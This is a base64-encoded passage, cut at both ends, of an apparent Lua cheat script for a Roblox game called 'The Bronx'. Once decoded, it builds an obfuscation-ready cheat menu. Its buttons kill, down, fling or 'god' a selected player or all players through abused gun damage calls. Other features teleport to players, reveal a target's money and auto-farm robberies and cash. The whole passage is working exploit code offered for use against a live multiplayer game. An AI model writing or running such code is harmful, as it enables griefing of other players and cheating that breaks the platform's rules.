ZHRoID0gMTIwLCBpdGVtcyA9IF9VSU5hbWVzLCBzZXBlcmF0b3IgPSBmYWxzZSwgbXVsdGkgPSBmYWxzZSwgZGVmYXVsdCA9ICdCcm9ueCBNYXJrZXQgMid9KQoKICAgICAgICAgICAgICAgIF9VSV9FbmFibGVkVG9nZ2xlID0gVUlTZWN0aW9uOnRvZ2dsZSh7bmFtZSA9ICJVSSBFbmFibGVkIiwgdHlwZSA9ICd0b2dnbGUnLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBpZiB0b3N0cmluZyhsaWJyYXJ5LmZsYWdzWyJTZWxlY3RlZFVJX1RCMyJdKSA9PSAiQVRNIEdVSSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgU2VsZWN0ZWRVSSA9IExvY2FsUGxheWVyLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiQVRNR3VpIikKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgU2VsZWN0ZWRVSSBhbmQgc3RhdGUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIF9DbG9uZSA9IExpZ2h0aW5nLkFzc2V0cy5HVUkuQVRNR3VpOkNsb25lKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfQ2xvbmUuUGFyZW50ID0gTG9jYWxQbGF5ZXIuUGxheWVyR3VpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VsZWN0ZWRVSSA9IF9DbG9uZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9DbG9uZS5GcmFtZS5jbG9zZUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX1VJX0VuYWJsZWRUb2dnbGUuc2V0KGZhbHNlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLV9DbG9uZTpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc3RhdGUgYW5kIFNlbGVjdGVkVUkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbGVjdGVkVUk6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBPbGRfVUlfVmFsdWUgPSBsaWJyYXJ5LmZsYWdzWyJTZWxlY3RlZFVJX1RCMyJdCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGlsIGxpYnJhcnkuZmxhZ3NbIlNlbGVjdGVkVUlfVEIzIl0gfj0gT2xkX1VJX1ZhbHVlCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgU2VsZWN0ZWRVSSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VsZWN0ZWRVSTpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIF9VSV9FbmFibGVkVG9nZ2xlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfVUlfRW5hYmxlZFRvZ2dsZS5zZXQoZmFsc2UpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBTZWxlY3RlZFVJID0gTG9jYWxQbGF5ZXIuUGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKGxpYnJhcnkuZmxhZ3NbIlNlbGVjdGVkVUlfVEIzIl0pKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgU2VsZWN0ZWRVSSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZWxlY3RlZFVJLkVuYWJsZWQgPSBzdGF0ZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIE9sZF9VSV9WYWx1ZSA9IGxpYnJhcnkuZmxhZ3NbIlNlbGVjdGVkVUlfVEIzIl0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgbGlicmFyeS5mbGFnc1siU2VsZWN0ZWRVSV9UQjMiXSB+PSBPbGRfVUlfVmFsdWUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZWxlY3RlZFVJLkVuYWJsZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgX1VJX0VuYWJsZWRUb2dnbGUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9VSV9FbmFibGVkVG9nZ2xlLnNldChmYWxzZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgICAgIGVuZH0pCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgZG8gLS0gXFwgUGxheWVycyBUYWIKICAgICAgICAgICAgICAgIGxvY2FsIENvbHVtbiA9IFBsYXllcnNUYWI6Y29sdW1uKHt9KQoKICAgICAgICAgICAgICAgIGxvY2FsIFBsYXllckxpc3RTZWN0aW9uID0gQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiU2VsZWN0IFBsYXllciIsIHNpemUgPSAxLCBkZWZhdWx0ID0gZmFsc2UsIHNpZGUgPSAnbGVmdCcgLS1bWzMgcGVvcGxlIGljb25dXX0pCgogICAgICAgICAgICAgICAgbG9jYWwgUGxheWVyTGlzdCA9IFBsYXllckxpc3RTZWN0aW9uOmxpc3Qoe2ZsYWcgPSAiU2VsZWN0UGxheWVyX1RoZUJyb254Iiwgb3B0aW9ucyA9IHt9LCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIgPSB0b3N0cmluZyhzdGF0ZSkKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgbG9jYWwgUmVmcmVzaFBsYXllcnMgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgQ2FjaGUgPSB7fQoKICAgICAgICAgICAgICAgICAgICBmb3IgaSwgUGxheWVyIGluIFBsYXllcnM6R2V0UGxheWVycygpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFBsYXllciA9PSBMb2NhbFBsYXllciB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KENhY2hlLCBQbGF5ZXIuTmFtZSkKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgdGFibGUuc29ydChDYWNoZSkKCiAgICAgICAgICAgICAgICAgICAgUGxheWVyTGlzdC5yZWZyZXNoX29wdGlvbnMoQ2FjaGUpCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgdGFzay5zcGF3bihSZWZyZXNoUGxheWVycykKCiAgICAgICAgICAgICAgICBQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QoUmVmcmVzaFBsYXllcnMpCgogICAgICAgICAgICAgICAgUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KFJlZnJlc2hQbGF5ZXJzKQoKICAgICAgICAgICAgICAgIENvbHVtbiA9IFBsYXllcnNUYWI6Y29sdW1uKHt9KQoKICAgICAgICAgICAgICAgIGxvY2FsIFBsYXllck9wdGlvbnNTZWN0aW9uID0gQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiUGxheWVyIE9wdGlvbnMiLCBzaXplID0gMSwgZGVmYXVsdCA9IGZhbHNlLCBzaWRlID0gJ3JpZ2h0JywgaWNvbiA9IEdldEltYWdlKCJXcmVuY2gucG5nIil9KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBQbGF5ZXJPcHRpb25zU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJTcGVjdGF0ZSBQbGF5ZXIiLCBmbGFnID0gIlNwZWN0YXRlUGxheWVyX1RoZUJyb254IiwgZGVmYXVsdCA9IGZhbHNlLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU3BlY3RhdGVQbGF5ZXIgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCgogICAgICAgICAgICAgICAgUGxheWVyT3B0aW9uc1NlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiQnJpbmcgUGxheWVyIiwgZmxhZyA9ICJCcmluZ1BsYXllcl9UaGVCcm9ueCIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLkJyaW5naW5nUGxheWVyID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgUGxheWVyT3B0aW9uc1NlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiQnVnIC8gS2lsbCBQbGF5ZXIgLSBDYXIiLCBmbGFnID0gIkJ1Z1BsYXllcl9UaGVCcm9ueCIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLkJ1Z1BsYXllciA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIFBsYXllck9wdGlvbnNTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkF1dG8gS2lsbCBQbGF5ZXIgLSBHdW4iLCBmbGFnID0gIkF1dG9LaWxsUGxheWVyX1RoZUJyb254IiwgZGVmYXVsdCA9IGZhbHNlLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuQXV0b0tpbGwgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBQbGF5ZXJPcHRpb25zU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJBdXRvIFJhZ2RvbGwgUGxheWVyIC0gR3VuIiwgZmxhZyA9ICJBdXRvUmFnZG9sbFBsYXllcl9UaGVCcm9ueCIsIHNlcGVyYXRvciA9IHRydWUsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLkF1dG9SYWdkb2xsID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pCgoKICAgICAgICAgICAgICAgIFBsYXllck9wdGlvbnNTZWN0aW9uOmJ1dHRvbih7bmFtZSA9ICJUZWxlcG9ydCBUbyBQbGF5ZXIiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKFRlbGVwb3J0LCBQbGF5ZXJzW0NvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXJdLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSkKICAgICAgICAgICAgICAgIGVuZH0pCgpQbGF5ZXJPcHRpb25zU2VjdGlvbjpidXR0b24oewogICAgbmFtZSA9ICJTaG93IFRhcmdldCBNb25leSIsCiAgICBjYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCB0YXJnZXROYW1lID0gQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcgogICAgICAgIGlmIG5vdCB0YXJnZXROYW1lIHRoZW4KICAgICAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgICAgIGluZm8gPSAiTm8gUGxheWVyIFNlbGVjdGVkISIsCiAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIHRhcmdldCA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpOkZpbmRGaXJzdENoaWxkKHRhcmdldE5hbWUpCiAgICAgICAgaWYgbm90IHRhcmdldCB0aGVuCiAgICAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsCiAgICAgICAgICAgICAgICBpbmZvID0gIlBsYXllciBOb3QgRm91bmQhIiwKICAgICAgICAgICAgICAgIGxpZmV0aW1lID0gNQogICAgICAgICAgICB9KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgc3RvcmVkID0gdGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJzdG9yZWQiKQogICAgICAgIGlmIG5vdCBzdG9yZWQgdGhlbgogICAgICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICAgICAgaW5mbyA9ICJObyBTdG9yZWQgRm9sZGVyIEZvdW5kISIsCiAgICAgICAgICAgICAgICBsaWZldGltZSA9IDUKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGJhbmsgPSBzdG9yZWQ6RmluZEZpcnN0Q2hpbGQoIkJhbmsiKQogICAgICAgIGxvY2FsIGZpbHRoeSA9IHN0b3JlZDpGaW5kRmlyc3RDaGlsZCgiRmlsdGh5U3RhY2siKQogICAgICAgIGxvY2FsIG1vbmV5ID0gc3RvcmVkOkZpbmRGaXJzdENoaWxkKCJNb25leSIpCgogICAgICAgIGxvY2FsIGJhbmtWYWx1ZSA9IGJhbmsgYW5kIGJhbmsuVmFsdWUgb3IgIk5vdCBGb3VuZCIKICAgICAgICBsb2NhbCBmaWx0aHlWYWx1ZSA9IGZpbHRoeSBhbmQgZmlsdGh5LlZhbHVlIG9yICJOb3QgRm91bmQiCiAgICAgICAgbG9jYWwgbW9uZXlWYWx1ZSA9IG1vbmV5IGFuZCBtb25leS5WYWx1ZSBvciAiTm90IEZvdW5kIgoKICAgICAgICBsaWJyYXJ5Lm5vdGlmaWNhdGlvbnM6Y3JlYXRlX25vdGlmaWNhdGlvbih7CiAgICAgICAgICAgIG5hbWUgPSAiUmVkbGluZSIsICAgICAgICAgIAogICAgICAgICAgICBpbmZvID0gIkJhbms6ICIgLi4gYmFua1ZhbHVlLCAgICAgICAgICAKICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgfSkKCiAgICAgICAgIGxpYnJhcnkubm90aWZpY2F0aW9uczpjcmVhdGVfbm90aWZpY2F0aW9uKHsKICAgICAgICAgICAgbmFtZSA9ICJSZWRsaW5lIiwKICAgICAgICAgICAgaW5mbyA9ICJGaWx0aHlTdGFjazogIiAuLiBmaWx0aHlWYWx1ZSwKICAgICAgICAgICAgbGlmZXRpbWUgPSA1CiAgICAgICAgfSkKCiAgICAgICAgbGlicmFyeS5ub3RpZmljYXRpb25zOmNyZWF0ZV9ub3RpZmljYXRpb24oewogICAgICAgICAgICBuYW1lID0gIlJlZGxpbmUiLAogICAgICAgICAgICBpbmZvID0gIk1vbmV5OiAiIC4uIG1vbmV5VmFsdWUsCiAgICAgICAgICAgIGxpZmV0aW1lID0gNQogICAgfSkKICAgIGVuZAp9KQotLSB2aWV3IGJhbmsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgUGxheWVyT3B0aW9uc1NlY3Rpb246YnV0dG9uKHtuYW1lID0gIkRvd24gUGxheWVyIC0gSG9sZCBHdW4iLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIHBjYWxsKGtpbGxfZ3VuLCBDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyLCAiSHVtYW5vaWRSb290UGFydCIsIChQbGF5ZXJzW0NvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXJdLkNoYXJhY3Rlci5IdW1hbm9pZC5IZWFsdGggLSA1KSkKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgUGxheWVyT3B0aW9uc1NlY3Rpb246YnV0dG9uKHtuYW1lID0gIktpbGwgUGxheWVyIC0gSG9sZCBHdW4iLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIHBjYWxsKGtpbGxfZ3VuLCBDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyLCAiSHVtYW5vaWRSb290UGFydCIsIG1hdGguaHVnZSkKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgUGxheWVyT3B0aW9uc1NlY3Rpb246YnV0dG9uKHtuYW1lID0gIkdvZCBQbGF5ZXIgLSBIb2xkIEd1biIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoa2lsbF9ndW4sIENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIsICJIdW1hbm9pZFJvb3RQYXJ0IiwgbWF0aC5zcXJ0KC0xKSkKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgUGxheWVyT3B0aW9uc1NlY3Rpb246YnV0dG9uKHtuYW1lID0gIkZsaW5nIFBsYXllciAtIEhvbGQgR3VuIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXg9MSwgNTAgZG8KICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoa2lsbF9ndW4sIENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIsICJMZWZ0VXBwZXJMZWciLCAwLjAxKSAtLVJpZ2h0VXBwZXJMZWcKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgUGxheWVyT3B0aW9uc1NlY3Rpb246YnV0dG9uKHtuYW1lID0gIkdvZCBBbGwgUGxheWVycyAtIEhvbGQgR3VuIiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gUGxheWVyczpHZXRQbGF5ZXJzKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlIH49IExvY2FsUGxheWVyIGFuZCBWYWx1ZS5DaGFyYWN0ZXIgYW5kIFZhbHVlLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBhbmQgVmFsdWUuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpLkhlYWx0aCB+PSAwIGFuZCBub3QgVmFsdWUuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiRm9yY2VGaWVsZCIpIGFuZCBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoa2lsbF9ndW4sIFZhbHVlLk5hbWUsICJIdW1hbm9pZFJvb3RQYXJ0IiwgbWF0aC5zcXJ0KC0xKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkpCiAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBQbGF5ZXJPcHRpb25zU2VjdGlvbjpidXR0b24oe25hbWUgPSAiS2lsbCBBbGwgUGxheWVycyAtIEhvbGQgR3VuIiwgY2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gUGxheWVyczpHZXRQbGF5ZXJzKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlIH49IExvY2FsUGxheWVyIGFuZCBWYWx1ZS5DaGFyYWN0ZXIgYW5kIFZhbHVlLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBhbmQgVmFsdWUuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpLkhlYWx0aCB+PSAwIGFuZCBub3QgVmFsdWUuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiRm9yY2VGaWVsZCIpIGFuZCBWYWx1ZS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoa2lsbF9ndW4sIFZhbHVlLk5hbWUsICJIdW1hbm9pZFJvb3RQYXJ0IiwgbWF0aC5odWdlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgICAgIGVuZH0pCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGRvIC0tIFxcIE1pc2MgVGFiCiAgICAgICAgICAgICAgICBsb2NhbCBDb2x1bW4gPSBNaXNjVGFiOmNvbHVtbih7fSkKCiAgICAgICAgICAgICAgICBsb2NhbCBGYXJtaW5nU2VjdGlvbiA9IENvbHVtbjpzZWN0aW9uKHtuYW1lID0gIkZhcm1pbmciLCBzaXplID0gMC41MjAsIGRlZmF1bHQgPSBmYWxzZSwgc2lkZSA9ICdsZWZ0JywgaWNvbiA9IEdldEltYWdlKCJXaGVhdHQucG5nIil9KQoKICAgICAgICAgICAgICAgIEZhcm1pbmdTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkF1dG8gRmFybSBDb25zdHJ1Y3Rpb24iLCBmbGFnID0gIkZhcm1Db25zdHJ1Y3Rpb25fVGhlQnJvbngiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LkZhcm1zLkZhcm1Db25zdHJ1Y3Rpb25Kb2IgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICAtLVtbRmFybWluZ1NlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiQXV0byBGYXJtIEJhbmsgUm9iYmVyeSIsIGZsYWcgPSAiRmFybUJhbmtfVGhlQnJvbngiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LkZhcm1zLkZhcm1CYW5rID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pXV0KCiAgICAgICAgICAgICAgICBGYXJtaW5nU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJBdXRvIEZhcm0gSG91c2UgUm9iYmVyeSIsIGZsYWcgPSAiRmFybUhvdXNlc19UaGVCcm9ueCIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguRmFybXMuRmFybUhvdXNlcyA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEZhcm1pbmdTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkF1dG8gRmFybSBTdHVkaW8gUm9iYmVyeSIsIGZsYWcgPSAiRmFybVN0dWRpb19UaGVCcm9ueCIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguRmFybXMuRmFybVN0dWRpbyA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEZhcm1pbmdTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkF1dG8gQ29sbGVjdCBEcm9wcGVkIENhc2giLCBmbGFnID0gIkZhcm1Ecm9wcGVkTW9uZXlfVGhlQnJvbngiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LkZhcm1zLkNvbGxlY3REcm9wcGVkTW9uZXkgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBGYXJtaW5nU2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJBdXRvIENvbGxlY3QgRHJvcHBlZCBCYWdzIiwgZmxhZyA9ICJGYXJtRHJvcHBlZExvb3RfVGhlQnJvbngiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LkZhcm1zLkNvbGxlY3REcm9wcGVkTG9vdCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEZhcm1pbmdTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkF1dG8gRmFybSBUcmFzaCIsIGZsYWcgPSAiRmFybUR1bXBzdGVyc19UaGVCcm9ueCIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuVGhlQnJvbnguRmFybXMuRmFybVRyYXNoID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgRmFybWluZ1NlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiQXV0byBTZWxsIFRyYXNoIiwgZmxhZyA9ICJTZWxsVHJhc2hfVGhlQnJvbngiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254LkZhcm1zLkF1dG9TZWxsVHJhc2ggPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBsb2NhbCBtZWdhcGhvbmVzZWN0aW9uID0gQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiTWVnYXBob25lIExpc3QiLCBzaWRlID0gImxlZnQiLCBzaXplID0gMC40NzAsIGljb24gPSBHZXRJbWFnZSgiV3JlbmNoLnBuZyIpfSkgICAKICAgIC